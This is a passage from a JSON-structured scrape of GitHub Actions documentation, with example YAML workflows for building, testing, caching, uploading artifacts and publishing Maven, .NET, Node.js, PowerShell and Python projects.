        "language": "yaml",
        "content": "steps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n  - name: Run the Maven verify phase\n    run: mvn --batch-mode --update-snapshots verify"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Caching dependencies"
      },
      {
        "type": "paragraph",
        "text": "You can cache your dependencies to speed up your workflow runs. After a successful run, your local Maven repository will be stored in a cache. In future workflow runs, the cache will be restored so that dependencies don't need to be downloaded from remote Maven repositories. You can cache dependencies simply using thesetup-javaactionor can usecacheactionfor custom and more advanced configuration."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/checkout@v4\n  - name: Set up JDK 17\n    uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n      cache: maven\n  - name: Build with Maven\n    run: mvn --batch-mode --update-snapshots verify"
      },
      {
        "type": "paragraph",
        "text": "This workflow will save the contents of your local Maven repository, located in the.m2directory of the runner's home directory. The cache key will be the hashed contents ofpom.xml, so changes topom.xmlwill invalidate the cache."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Packaging workflow data as artifacts"
      },
      {
        "type": "paragraph",
        "text": "After your build has succeeded and your tests have passed, you may want to upload the resulting Java packages as a build artifact. This will store the built packages as part of the workflow run, and allow you to download them. Artifacts can help you test and debug pull requests in your local environment before they're merged. For more information, seeStoring and sharing data from a workflow."
      },
      {
        "type": "paragraph",
        "text": "Maven will usually create output files like JARs, EARs, or WARs in thetargetdirectory. To upload those as artifacts, you can copy them into a new directory that contains artifacts to upload. For example, you can create a directory calledstaging. Then you can upload the contents of that directory using theupload-artifactaction."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n  - run: mvn --batch-mode --update-snapshots verify\n  - run: mkdir staging && cp target/*.jar staging\n  - uses: actions/upload-artifact@v4\n    with:\n      name: Package\n      path: staging"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-net",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to build, test, and publish a .NET package."
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have a tools cache with preinstalled software, which includes the .NET Core SDK. For a full list of up-to-date software and the preinstalled versions of .NET Core SDK, seesoftware installed on GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should already be familiar with YAML syntax and how it's used with GitHub Actions. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of the .NET Core SDK. For more information, seeGetting started with .NET."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a .NET workflow template"
      },
      {
        "type": "paragraph",
        "text": "To get started quickly, add a workflow template to the.github/workflowsdirectory of your repository."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides a workflow template for .NET that should work for most .NET projects. The subsequent sections of this guide give examples of how you can customize this workflow template."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "If you already have a workflow in your repository, clickNew workflow.",
          "The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"dotnet\".",
          "On the \".NET\" workflow, clickConfigure.",
          "Edit the workflow as required. For example, change the .NET version.",
          "ClickCommit changes.Thedotnet.ymlworkflow file is added to the.github/workflowsdirectory of your repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Specifying a .NET version"
      },
      {
        "type": "paragraph",
        "text": "To use a preinstalled version of the .NET Core SDK on a GitHub-hosted runner, use thesetup-dotnetaction. This action finds a specific version of .NET from the tools cache on each runner, and adds the necessary binaries toPATH. These changes will persist for the remainder of the job."
      },
      {
        "type": "paragraph",
        "text": "Thesetup-dotnetaction is the recommended way of using .NET with GitHub Actions, because it ensures consistent behavior across different runners and different versions of .NET. If you are using a self-hosted runner, you must install .NET and add it toPATH. For more information, see thesetup-dotnetaction."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using multiple .NET versions"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: dotnet package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        dotnet-version: [ '3.1.x', '6.0.x' ]\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup dotnet ${{ matrix.dotnet-version }}\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: ${{ matrix.dotnet-version }}\n      # You can test your matrix by printing the current dotnet version\n      - name: Display dotnet version\n        run: dotnet --version"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a specific .NET version"
      },
      {
        "type": "paragraph",
        "text": "You can configure your job to use a specific version of .NET, such as6.0.22. Alternatively, you can use semantic version syntax to get the latest minor release. This example uses the latest minor release of .NET 6."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Setup .NET 6.x\n      uses: actions/setup-dotnet@v4\n      with:\n        # Semantic version range syntax or exact version of a dotnet version\n        dotnet-version: '6.x'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing dependencies"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have the NuGet package manager installed. You can use the dotnet CLI to install dependencies from the NuGet package registry before building and testing your code. For example, the YAML below installs theNewtonsoftpackage."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Setup dotnet\n  uses: actions/setup-dotnet@v4\n  with:\n    dotnet-version: '6.0.x'\n- name: Install dependencies\n  run: dotnet add package Newtonsoft.Json --version 12.0.1"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Caching dependencies"
      },
      {
        "type": "paragraph",
        "text": "You can cache NuGet dependencies for future workflows using the optionalcacheinput. For example, the YAML below caches the NuGetglobal-packagesfolder, and then installs theNewtonsoftpackage. A second optional input,cache-dependency-path, can be used to specify the path to a dependency file:packages.lock.json."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeCaching dependencies to speed up workflows."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Setup dotnet\n  uses: actions/setup-dotnet@v4\n  with:\n    dotnet-version: '6.x'\n    cache: true\n- name: Install dependencies\n  run: dotnet add package Newtonsoft.Json --version 12.0.1"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Depending on the number of dependencies, it may be faster to use the dependency cache. Projects with many large dependencies should see a performance increase as it cuts down the time required for downloading. Projects with fewer dependencies may not see a significant performance increase and may even see a slight decrease due to how NuGet installs cached dependencies. The performance varies from project to project."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Building and testing your code"
      },
      {
        "type": "paragraph",
        "text": "You can use the same commands that you use locally to build and test your code. This example demonstrates how to usedotnet buildanddotnet testin a job:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Setup dotnet\n  uses: actions/setup-dotnet@v4\n  with:\n    dotnet-version: '6.0.x'\n- name: Install dependencies\n  run: dotnet restore\n- name: Build\n  run: dotnet build --no-restore\n- name: Test with the dotnet CLI\n  run: dotnet test --no-build"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Packaging workflow data as artifacts"
      },
      {
        "type": "paragraph",
        "text": "After a workflow completes, you can upload the resulting artifacts for analysis. For example, you may need to save log files, core dumps, test results, or screenshots. The following example demonstrates how you can use theupload-artifactaction to upload test results."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeStoring and sharing data from a workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: dotnet package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        dotnet-version: [ '3.1.x', '6.0.x' ]\n\n      steps:\n        - uses: actions/checkout@v4\n        - name: Setup dotnet\n          uses: actions/setup-dotnet@v4\n          with:\n            dotnet-version: ${{ matrix.dotnet-version }}\n        - name: Install dependencies\n          run: dotnet restore\n        - name: Test with dotnet\n          run: dotnet test --no-restore --logger trx --results-directory \"TestResults-${{ matrix.dotnet-version }}\"\n        - name: Upload dotnet test results\n          uses: actions/upload-artifact@v4\n          with:\n            name: dotnet-results-${{ matrix.dotnet-version }}\n            path: TestResults-${{ matrix.dotnet-version }}\n          # Use always() to always run this step to publish test results when there are test failures\n          if: ${{ always() }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing to package registries"
      },
      {
        "type": "paragraph",
        "text": "You can configure your workflow to publish your .NET package to a package registry when your CI tests pass. You can use repository secrets to store any tokens or credentials needed to publish your binary. The following example creates and publishes a package to GitHub Packages usingdotnet core cli."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Upload dotnet package\n\non:\n  release:\n    types: [created]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: '6.0.x' # SDK Version to use.\n          source-url: https://nuget.pkg.github.com/<owner>/index.json\n        env:\n          NUGET_AUTH_TOKEN: ${{secrets.GITHUB_TOKEN}}\n      - run: dotnet build --configuration Release <my project>\n      - name: Create the package\n        run: dotnet pack --configuration Release <my project>\n      - name: Publish the package to GPR\n        run: dotnet nuget push <my project>/bin/Release/*.nupkg"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to create a continuous integration (CI) workflow that builds and tests Node.js code. If your CI tests pass, you may want to deploy your code or publish a package."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of Node.js, YAML, workflow configuration options, and how to create a workflow file. For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Writing workflows",
          "Getting started with Node.js"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a Node.js workflow template"
      },
      {
        "type": "paragraph",
        "text": "To get started quickly, add a workflow template to the.github/workflowsdirectory of your repository."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides a workflow template for Node.js that should work for most Node.js projects. The subsequent sections of this guide give examples of how you can customize this workflow template."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "If you already have a workflow in your repository, clickNew workflow.",
          "The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Node.js\".",
          "Filter the selection of workflows by clickingContinuous integration.",
          "On the \"Node.js\" workflow, clickConfigure.",
          "Edit the workflow as required. For example, change the Node versions you want to use.",
          "ClickCommit changes.Thenode.js.ymlworkflow file is added to the.github/workflowsdirectory of your repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Specifying the Node.js version"
      },
      {
        "type": "paragraph",
        "text": "The easiest way to specify a Node.js version is by using thesetup-nodeaction provided by GitHub. For more information see,setup-node."
      },
      {
        "type": "paragraph",
        "text": "Thesetup-nodeaction takes a Node.js version as an input and configures that version on the runner. Thesetup-nodeaction finds a specific version of Node.js from the tools cache on each runner and adds the necessary binaries toPATH, which persists for the rest of the job. Using thesetup-nodeaction is the recommended way of using Node.js with GitHub Actions because it ensures consistent behavior across different runners and different versions of Node.js. If you are using a self-hosted runner, you must install Node.js and add it toPATH."
      },
      {
        "type": "paragraph",
        "text": "The workflow template includes a matrix strategy that builds and tests your code with the Node.js versions listed innode-version. The 'x' in the version number is a wildcard character that matches the latest minor and patch release available for a version. Each version of Node.js specified in thenode-versionarray creates a job that runs the same steps."
      },
      {
        "type": "paragraph",
        "text": "Each job can access the value defined in the matrixnode-versionarray using thematrixcontext. Thesetup-nodeaction uses the context as thenode-versioninput. Thesetup-nodeaction configures each job with a different Node.js version before building and testing code. For more information about matrix strategies and contexts, seeWorkflow syntax for GitHub ActionsandAccessing contextual information about workflow runs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "strategy:\n  matrix:\n    node-version: ['18.x', '20.x']\n\nsteps:\n- uses: actions/checkout@v4\n- name: Use Node.js ${{ matrix.node-version }}\n  uses: actions/setup-node@v4\n  with:\n    node-version: ${{ matrix.node-version }}"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can build and test with exact Node.js versions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "strategy:\n  matrix:\n    node-version: ['10.17.0', '17.9.0']"
      },
      {
        "type": "paragraph",
        "text": "Or, you can build and test using a single version of Node.js too."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Node.js CI\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Use Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20.x'\n      - run: npm ci\n      - run: npm run build --if-present\n      - run: npm test"
      },
      {
        "type": "paragraph",
        "text": "If you don't specify a Node.js version, GitHub uses the environment's default Node.js version.\nFor more information, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing dependencies"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have npm and Yarn dependency managers installed. You can use npm and Yarn to install dependencies in your workflow before building and testing your code. The Windows and Linux GitHub-hosted runners also have Grunt, Gulp, and Bower installed."
      },
      {
        "type": "paragraph",
        "text": "You can also cache dependencies to speed up your workflow. For more information, seeCaching dependencies to speed up workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example using npm"
      },
      {
        "type": "paragraph",
        "text": "This example installs the versions in thepackage-lock.jsonornpm-shrinkwrap.jsonfile and prevents updates to the lock file. Usingnpm ciis generally faster than runningnpm install. For more information, seenpm ciandIntroducingnpm cifor faster, more reliable builds."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Use Node.js\n  uses: actions/setup-node@v4\n  with:\n    node-version: '20.x'\n- name: Install dependencies\n  run: npm ci"
      },
      {
        "type": "paragraph",
        "text": "Usingnpm installinstalls the dependencies defined in thepackage.jsonfile. For more information, seenpm install."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Use Node.js\n  uses: actions/setup-node@v4\n  with:\n    node-version: '20.x'\n- name: Install dependencies\n  run: npm install"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example using Yarn"
      },
      {
        "type": "paragraph",
        "text": "This example installs the dependencies defined in theyarn.lockfile and prevents updates to theyarn.lockfile. For more information, seeyarn install."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Use Node.js\n  uses: actions/setup-node@v4\n  with:\n    node-version: '20.x'\n- name: Install dependencies\n  run: yarn --frozen-lockfile"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can install the dependencies defined in thepackage.jsonfile."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Use Node.js\n  uses: actions/setup-node@v4\n  with:\n    node-version: '20.x'\n- name: Install dependencies\n  run: yarn"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example using a private registry and creating the .npmrc file"
      },
      {
        "type": "paragraph",
        "text": "You can use thesetup-nodeaction to create a local.npmrcfile on the runner that configures the default registry and scope. Thesetup-nodeaction also accepts an authentication token as input, used to access private registries or publish node packages. For more information, seesetup-node."
      },
      {
        "type": "paragraph",
        "text": "To authenticate to your private registry, you'll need to store your npm authentication token as a secret. For example, create a repository secret calledNPM_TOKEN. For more information, seeUsing secrets in GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "In the example below, the secretNPM_TOKENstores the npm authentication token. Thesetup-nodeaction configures the.npmrcfile to read the npm authentication token from theNODE_AUTH_TOKENenvironment variable. When using thesetup-nodeaction to create an.npmrcfile, you must set theNODE_AUTH_TOKENenvironment variable with the secret that contains your npm authentication token."
      },
      {
        "type": "paragraph",
        "text": "Before installing dependencies, use thesetup-nodeaction to create the.npmrcfile. The action has two input parameters. Thenode-versionparameter sets the Node.js version, and theregistry-urlparameter sets the default registry. If your package registry uses scopes, you must use thescopeparameter. For more information, seenpm-scope."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Use Node.js\n  uses: actions/setup-node@v4\n  with:\n    always-auth: true\n    node-version: '20.x'\n    registry-url: https://registry.npmjs.org\n    scope: '@octocat'\n- name: Install dependencies\n  run: npm ci\n  env:\n    NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}"
      },
      {
        "type": "paragraph",
        "text": "The example above creates an.npmrcfile with the following contents:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}\n@octocat:registry=https://registry.npmjs.org/\nalways-auth=true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example caching dependencies"
      },
      {
        "type": "paragraph",
        "text": "You can cache and restore the dependencies using thesetup-nodeaction."
      },
      {
        "type": "paragraph",
        "text": "The following example caches dependencies for npm."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- uses: actions/setup-node@v4\n  with:\n    node-version: '20'\n    cache: 'npm'\n- run: npm install\n- run: npm test"
      },
      {
        "type": "paragraph",
        "text": "The following example caches dependencies for Yarn."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- uses: actions/setup-node@v4\n  with:\n    node-version: '20'\n    cache: 'yarn'\n- run: yarn\n- run: yarn test"
      },
      {
        "type": "paragraph",
        "text": "The following example caches dependencies for pnpm (v6.10+)."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# NOTE: pnpm caching support requires pnpm version >= 6.10.0\n\nsteps:\n- uses: actions/checkout@v4\n- uses: pnpm/action-setup@0609f0983b7a228f052f81ef4c3d6510cae254ad\n  with:\n    version: 6.10.0\n- uses: actions/setup-node@v4\n  with:\n    node-version: '20'\n    cache: 'pnpm'\n- run: pnpm install\n- run: pnpm test"
      },
      {
        "type": "paragraph",
        "text": "If you have a custom requirement or need finer controls for caching, you can use thecacheaction. For more information, seeCaching dependencies to speed up workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Building and testing your code"
      },
      {
        "type": "paragraph",
        "text": "You can use the same commands that you use locally to build and test your code. For example, if you runnpm run buildto run build steps defined in yourpackage.jsonfile andnpm testto run your test suite, you would add those commands in your workflow file."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n- uses: actions/checkout@v4\n- name: Use Node.js\n  uses: actions/setup-node@v4\n  with:\n    node-version: '20.x'\n- run: npm install\n- run: npm run build --if-present\n- run: npm test"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Packaging workflow data as artifacts"
      },
      {
        "type": "paragraph",
        "text": "You can save artifacts from your build and test steps to view after a job completes. For example, you may need to save log files, core dumps, test results, or screenshots. For more information, seeStoring and sharing data from a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing to package registries"
      },
      {
        "type": "paragraph",
        "text": "You can configure your workflow to publish your Node.js package to a package registry after your CI tests pass. For more information about publishing to npm and GitHub Packages, seePublishing Node.js packages."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-powershell",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to use PowerShell for CI. It describes how to use Pester, install dependencies, test your module, and publish to the PowerShell Gallery."
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have a tools cache with pre-installed software, which includes PowerShell and Pester."
      },
      {
        "type": "paragraph",
        "text": "For a full list of up-to-date software and the pre-installed versions of PowerShell and Pester, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should be familiar with YAML and the syntax for GitHub Actions. For more information, seeWriting workflows."
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of PowerShell and Pester. For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Getting started with PowerShell",
          "Pester"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding a workflow for Pester"
      },
      {
        "type": "paragraph",
        "text": "To automate your testing with PowerShell and Pester, you can add a workflow that runs every time a change is pushed to your repository. In the following example,Test-Pathis used to check that a file calledresultsfile.logis present."
      },
      {
        "type": "paragraph",
        "text": "This example workflow file must be added to your repository's.github/workflows/directory:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Test PowerShell on Ubuntu\non: push\n\njobs:\n  pester-test:\n    name: Pester test\n    runs-on: ubuntu-latest\n    steps:\n      - name: Check out repository code\n        uses: actions/checkout@v4\n      - name: Perform a Pester test from the command-line\n        shell: pwsh\n        run: Test-Path resultsfile.log | Should -Be $true\n      - name: Perform a Pester test from the Tests.ps1 file\n        shell: pwsh\n        run: |\n          Invoke-Pester Unit.Tests.ps1 -Passthru"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "shell: pwsh- Configures the job to use PowerShell when running theruncommands.",
          "run: Test-Path resultsfile.log- Check whether a file calledresultsfile.logis present in the repository's root directory.",
          "Should -Be $true- Uses Pester to define an expected result. If the result is unexpected, then GitHub Actions flags this as a failed test. For example:",
          "Invoke-Pester Unit.Tests.ps1 -Passthru- Uses Pester to execute tests defined in a file calledUnit.Tests.ps1. For example, to perform the same test described above, theUnit.Tests.ps1will contain the following:Describe\"Check results file is present\"{\n    It\"Check results file is present\"{Test-Pathresultsfile.log | Should-Be$true}\n}"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "PowerShell module locations"
      },
      {
        "type": "paragraph",
        "text": "The table below describes the locations for various PowerShell modules in each GitHub-hosted runner."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "On Ubuntu runners, Azure PowerShell modules are stored in/usr/share/instead of the default location of PowerShell add-on modules (i.e./usr/local/share/powershell/Modules/)."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing dependencies"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have PowerShell 7 and Pester installed. You can useInstall-Moduleto install additional dependencies from the PowerShell Gallery before building and testing your code."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The pre-installed packages (such as Pester) used by GitHub-hosted runners are regularly updated, and can introduce significant changes. As a result, it is recommended that you always specify the required package versions by usingInstall-Modulewith-MaximumVersion."
      },
      {
        "type": "paragraph",
        "text": "You can also cache dependencies to speed up your workflow. For more information, seeCaching dependencies to speed up workflows."
      },
      {
        "type": "paragraph",
        "text": "For example, the following job installs theSqlServerandPSScriptAnalyzermodules:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  install-dependencies:\n    name: Install dependencies\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Install from PSGallery\n        shell: pwsh\n        run: |\n          Set-PSRepository PSGallery -InstallationPolicy Trusted\n          Install-Module SqlServer, PSScriptAnalyzer"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "By default, no repositories are trusted by PowerShell. When installing modules from the PowerShell Gallery, you must explicitly set the installation policy forPSGallerytoTrusted."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Caching dependencies"
      },
      {
        "type": "paragraph",
        "text": "You can cache PowerShell dependencies using a unique key, which allows you to restore the dependencies for future workflows with thecacheaction. For more information, seeCaching dependencies to speed up workflows."
      },
      {
        "type": "paragraph",
        "text": "PowerShell caches its dependencies in different locations, depending on the runner's operating system. For example, thepathlocation used in the following Ubuntu example will be different for a Windows operating system."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/checkout@v4\n  - name: Setup PowerShell module cache\n    id: cacher\n    uses: actions/cache@v4\n    with:\n      path: \"~/.local/share/powershell/Modules\"\n      key: ${{ runner.os }}-SqlServer-PSScriptAnalyzer\n  - name: Install required PowerShell modules\n    if: steps.cacher.outputs.cache-hit != 'true'\n    shell: pwsh\n    run: |\n      Set-PSRepository PSGallery -InstallationPolicy Trusted\n      Install-Module SqlServer, PSScriptAnalyzer -ErrorAction Stop"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Testing your code"
      },
      {
        "type": "paragraph",
        "text": "You can use the same commands that you use locally to build and test your code."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using PSScriptAnalyzer to lint code"
      },
      {
        "type": "paragraph",
        "text": "The following example installsPSScriptAnalyzerand uses it to lint allps1files in the repository. For more information, seePSScriptAnalyzer on GitHub."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "lint-with-PSScriptAnalyzer:\n    name: Install and run PSScriptAnalyzer\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Install PSScriptAnalyzer module\n        shell: pwsh\n        run: |\n          Set-PSRepository PSGallery -InstallationPolicy Trusted\n          Install-Module PSScriptAnalyzer -ErrorAction Stop\n      - name: Lint with PSScriptAnalyzer\n        shell: pwsh\n        run: |\n          Invoke-ScriptAnalyzer -Path *.ps1 -Recurse -Outvariable issues\n          $errors   = $issues.Where({$_.Severity -eq 'Error'})\n          $warnings = $issues.Where({$_.Severity -eq 'Warning'})\n          if ($errors) {\n              Write-Error \"There were $($errors.Count) errors and $($warnings.Count) warnings total.\" -ErrorAction Stop\n          } else {\n              Write-Output \"There were $($errors.Count) errors and $($warnings.Count) warnings total.\"\n          }"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Packaging workflow data as artifacts"
      },
      {
        "type": "paragraph",
        "text": "You can upload artifacts to view after a workflow completes. For example, you may need to save log files, core dumps, test results, or screenshots. For more information, seeStoring and sharing data from a workflow."
      },
      {
        "type": "paragraph",
        "text": "The following example demonstrates how you can use theupload-artifactaction to archive the test results received fromInvoke-Pester. For more information, see theupload-artifactaction."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Upload artifact from Ubuntu\n\non: [push]\n\njobs:\n  upload-pester-results:\n    name: Run Pester and upload results\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Test with Pester\n        shell: pwsh\n        run: Invoke-Pester Unit.Tests.ps1 -Passthru | Export-CliXml -Path Unit.Tests.xml\n      - name: Upload test results\n        uses: actions/upload-artifact@v4\n        with:\n          name: ubuntu-Unit-Tests\n          path: Unit.Tests.xml\n    if: ${{ always() }}"
      },
      {
        "type": "paragraph",
        "text": "Thealways()function configures the job to continue processing even if there are test failures. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Publishing to PowerShell Gallery"
      },
      {
        "type": "paragraph",
        "text": "You can configure your workflow to publish your PowerShell module to the PowerShell Gallery when your CI tests pass. You can use secrets to store any tokens or credentials needed to publish your package. For more information, seeUsing secrets in GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "The following example creates a package and usesPublish-Moduleto publish it to the PowerShell Gallery:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Publish PowerShell Module\n\non:\n  release:\n    types: [created]\n\njobs:\n  publish-to-gallery:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Build and publish\n        env:\n          NUGET_KEY: ${{ secrets.NUGET_KEY }}\n        shell: pwsh\n        run: |\n          ./build.ps1 -Path /tmp/samplemodule\n          Publish-Module -Path /tmp/samplemodule -NuGetApiKey $env:NUGET_KEY -Verbose"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-python",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to build, test, and publish a Python package."
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have a tools cache with pre-installed software, which includes Python and PyPy. You don't have to install anything! For a full list of up-to-date software and the pre-installed versions of Python and PyPy, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should be familiar with YAML and the syntax for GitHub Actions. For more information, seeWriting workflows."
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of Python, and pip. For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Getting started with Python",
          "Pip package manager"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a Python workflow template"
      },
      {
        "type": "paragraph",
        "text": "To get started quickly, add a workflow template to the.github/workflowsdirectory of your repository."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides a workflow template for Python that should work if your repository already contains at least one.pyfile. The subsequent sections of this guide give examples of how you can customize this workflow template."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "If you already have a workflow in your repository, clickNew workflow.",
